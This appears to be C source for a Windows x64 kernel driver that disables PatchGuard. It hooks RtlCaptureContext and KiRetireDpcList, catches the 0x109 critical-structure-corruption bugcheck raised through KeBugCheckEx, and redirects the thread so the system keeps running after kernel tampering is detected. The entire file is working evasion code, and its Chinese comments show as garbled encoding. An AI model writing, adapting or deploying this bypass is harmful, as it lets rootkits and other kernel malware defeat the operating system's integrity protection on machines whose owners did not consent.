#include "stdafx.h"

typedef struct _HOOK_CTX
{
	ULONG64 rax;
	ULONG64 rcx;
	ULONG64 rdx;
	ULONG64 rbx;
	ULONG64 rbp;
	ULONG64 rsi;
	ULONG64 rdi;
	ULONG64 r8;
	ULONG64 r9;
	ULONG64 r10;
	ULONG64 r11;
	ULONG64 r12;
	ULONG64 r13;
	ULONG64 r14;
	ULONG64 r15;
	ULONG64 Rflags;
	ULONG64 rsp;
}HOOK_CTX, *PHOOK_CTX;

typedef VOID(*TRtlCaptureContext)(PCONTEXT ContextRecord);
extern PVOID64 address;
extern VOID AdjustStackCallPointer(
	IN ULONG_PTR NewStackPointer,
	IN PVOID StartAddress,
	IN PVOID Argument);

extern CHAR GetCpuIndex();
extern VOID HookKiRetireDpcList();
extern VOID HookRtlCaptureContext();
extern VOID BackTo1942();

static ULONG g_ThreadContextRoutineOffset = 0;
static ULONG64 g_KeBugCheckExAddress = 0;
static UINT g_MaxCpu = 0;


KDPC  g_TempDpc[0x100];
ULONG64 g_CpuContextAddress = 0;
ULONG64 g_KiRetireDpcList = 0;

HOOK_INFO OrgRtlCaptureContext;
HOOK_INFO OrgKiRetireDpcList;

VOID PgTempDpc(
IN struct _KDPC *Dpc,
IN PVOID DeferredContext,
IN PVOID SystemArgument1,
IN PVOID SystemArgument2
)
{
	return;
}
VOID OnRtlCaptureContext(PHOOK_CTX hookCtx)
{
	ULONG64 Rcx;
	PCONTEXT pCtx = (PCONTEXT)(hookCtx->rcx);
	ULONG64 Rip = *(ULONG64 *)(hookCtx->rsp);
	TRtlCaptureContext OldRtlCaptureContext;
	OldRtlCaptureContext = (TRtlCaptureContext)OrgRtlCaptureContext.Bridge;

	OldRtlCaptureContext(pCtx);

	pCtx->Rsp = hookCtx->rsp + 0x08;
	pCtx->Rip = Rip;
	pCtx->Rax = hookCtx->rax;
	pCtx->Rbx = hookCtx->rbx;
	pCtx->Rcx = hookCtx->rcx;
	pCtx->Rdx = hookCtx->rdx;
	pCtx->Rsi = hookCtx->rsi;
	pCtx->Rdi = hookCtx->rdi;
	pCtx->Rbp = hookCtx->rbp;

	pCtx->R8 = hookCtx->r8;
	pCtx->R9 = hookCtx->r9;
	pCtx->R10 = hookCtx->r10;
	pCtx->R11 = hookCtx->r11;
	pCtx->R12 = hookCtx->r12;
	pCtx->R13 = hookCtx->r13;
	pCtx->R14 = hookCtx->r14;
	pCtx->R15 = hookCtx->r15;


	Rcx = *(ULONG64 *)(hookCtx->rsp + 0x48);
	//һ��ʼ�洢λ��rcx=[rsp+8+30]
	//call֮�����[rsp+8+30+8]

	if (Rcx == 0x109)
	{
		//PG��������
		if (Rip >= g_KeBugCheckExAddress && Rip <= g_KeBugCheckExAddress + 0x64)
		{

			//����KeBugCheckEx������
			// �Ȳ���һ��DPC
			//���IRQL�ļ��������DPC_LEVEL�ģ���˵�еĻص���ȥ�ļ�����
			//�������ͨ�ģ�������ThreadContext����
			PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
			PVOID StartRoutine = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
			PVOID StackPointer = IoGetInitialStack();
			CHAR  Cpu = GetCpuIndex();
			KeInitializeDpc(&g_TempDpc[Cpu],
				PgTempDpc,
				NULL);
			KeSetTargetProcessorDpc(&g_TempDpc[Cpu], (CCHAR)Cpu);
			//KeSetImportanceDpc( &g_TempDpc[Cpu], HighImportance);
			KeInsertQueueDpc(&g_TempDpc[Cpu], NULL, NULL);
			if (1){
				//Ӧ���жϰ汾��������¶���
				PCHAR StackPage = (PCHAR)IoGetInitialStack();

				*(ULONG64 *)StackPage = (((ULONG_PTR)StackPage + 0x1000) & 0x0FFFFFFFFFFFFF000);//stack��ʼ��MagicCode��
				// ���û����win7�Ժ��ϵͳ�ϻ�50����
			}
			if (KeGetCurrentIrql() != PASSIVE_LEVEL)
			{
				//ʱ�⵹����
				BackTo1942();//�ص�call KiRetireDpcListȥ�ˣ�
			}
			//�߳�TIMER��ֱ��ִ���߳�ȥ��
			AdjustStackCallPointer(
				(ULONG_PTR)StackPointer - 0x8,
				StartRoutine,
				NULL);
		}
	}
	return;
}
VOID JmpThreadContext()
{
	PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
	PVOID StartRoutine = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
	PVOID StackPointer = IoGetInitialStack();

	AdjustStackCallPointer(
		(ULONG_PTR)StackPointer - 0x8,
		StartRoutine,
		NULL);
}

VOID DisablePatchProtectionSystemThreadRoutine(
	IN PVOID Nothing)
{
	PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();
	for (g_ThreadContextRoutineOffset = 0;
		g_ThreadContextRoutineOffset < 0x1000;
		g_ThreadContextRoutineOffset += 4)
	{
		if (*(PVOID **)(CurrentThread +
			g_ThreadContextRoutineOffset) == (PVOID)DisablePatchProtectionSystemThreadRoutine)
			break;
	}

	if (g_ThreadContextRoutineOffset<0x1000)
	{
		g_KeBugCheckExAddress = (ULONG64)GetCALLByName(L"KeBugCheckEx");

		g_MaxCpu = (UINT)KeNumberProcessors;

		g_CpuContextAddress = (ULONG64)ExAllocatePool(NonPagedPool, 0x200 * g_MaxCpu + 0x1000);

		if (!g_CpuContextAddress)
		{
			return;
		}



		RtlZeroMemory(g_TempDpc, sizeof(KDPC) * 0x100);
		RtlZeroMemory((PVOID)g_CpuContextAddress, 0x200 * g_MaxCpu);


		HookFunction((ULONG_PTR)address, (ULONG_PTR)HookKiRetireDpcList, &OrgKiRetireDpcList);

		g_KiRetireDpcList = (ULONG64)(OrgKiRetireDpcList.Bridge);

		HookFunction((ULONG_PTR)GetCALLByName(L"RtlCaptureContext"), (ULONG_PTR)HookRtlCaptureContext, &OrgRtlCaptureContext);
	}
}
NTSTATUS DisablePatchProtection() {
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS          Status;
	HANDLE            ThreadHandle = NULL;

	InitializeObjectAttributes(
		&Attributes,
		NULL,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);


	Status = PsCreateSystemThread(
		&ThreadHandle,
		THREAD_ALL_ACCESS,
		&Attributes,
		NULL,
		NULL,
		DisablePatchProtectionSystemThreadRoutine,
		NULL);

	if (ThreadHandle)
		ZwClose(
		ThreadHandle);

	return Status;
}

VOID InitDisablePatchGuard()
{
	DisablePatchProtection();
}